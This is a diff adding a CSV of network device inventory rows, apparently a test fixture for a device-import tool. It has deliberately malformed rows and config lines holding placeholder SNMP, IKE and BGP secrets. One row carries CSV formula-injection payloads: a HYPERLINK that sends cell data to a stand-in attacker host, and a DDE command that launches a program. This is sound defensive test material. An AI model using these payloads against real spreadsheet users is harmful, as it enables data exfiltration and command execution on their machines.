@@ -1,0 +1,9 @@
+name,status,tenant,role,manufacturer,device_type,platform,serial,asset_tag,site,location,rack,position,face,primary_ip4,description,comments,tags,cf_owner,cf_warranty_end,cf_budget
+sw-01,active,Acme,Access switch,Juniper,EX2300-48P,Junos,JN123456AB,A-1001,HQ,Floor 1,R1,30,front,10.0.99.2/24,Floor 1 closet,"Upstairs; see ticket 4411",core;access,Facilities,2028-03-01,1200
+sw-02,active,Acme,Access switch,Juniper,EX2300-48P,Junos,JN123457CD,A-1002,HQ,Floor 1,R1,31,front,10.0.99.3/24,,"Spare",access,Facilities,2028-03-01,1200
+fw-01,active,Acme,Firewall,Juniper,SRX300,Junos,JN998877EF,A-1003,HQ,Floor 1,R1,40,front,10.0.99.1/24,Edge firewall,"set snmp community FATHOMIMPORTsnmpRoCommunity2f9c1d7e authorization read-only",edge,Security,2029-01-15,3400
+core-01,active,Acme,Core switch,Juniper,EX4300-48P,Junos,JN555500GH,A-1004,HQ,Floor 1,R1,31,front,10.0.99.4/24,Clashes with sw-02's unit,"set security ike policy ike-pol pre-shared-key ascii-text FATHOMIMPORTikePreSharedKey0123456789abcdef",core,IT,2028-07-01,900
+wifi-ap-3,active,Acme,Wireless AP,Ubiquiti,UAP-AC-Pro,,UB0001,A-1005,HQ,Floor 2,,,,10.0.50.13/24,,,wifi,Facilities,2027-05-05,150
+Core Switch 2,planned,Acme,Core switch,Acme,Box 9000,,SN 7 7 7,A-1006,HQ,Floor 1,R1,12,front,not-an-ip,,"set protocols bgp group ISP-EDGE authentication-key Tz9kQ4vL2mXa7PwkQ4vL2mXa7PwkQ4vL2mXa7PwkQ4vL2mXa7PwkQ4vL2mXa7PwkQ4vL2mXa7PwRb",,IT,2028-07-01,900
+=HYPERLINK("http://evil.example/?x="&A1),active,Acme,Server,Dell,R740xd,,DL0042,A-1007,HQ,Floor 1,R1,20,front,10.0.99.20/24,"+SUM(1+1)","@cmd|' /C calc'!A0",,-2+3,2028-01-01,-5
+sw-01,active,Acme,Access switch,Juniper,EX2300-48P,Junos,JN123456AB,A-1001,HQ,Floor 1,R1,30,front,10.0.99.2/24,duplicate row,,,Facilities,2028-03-01,1200
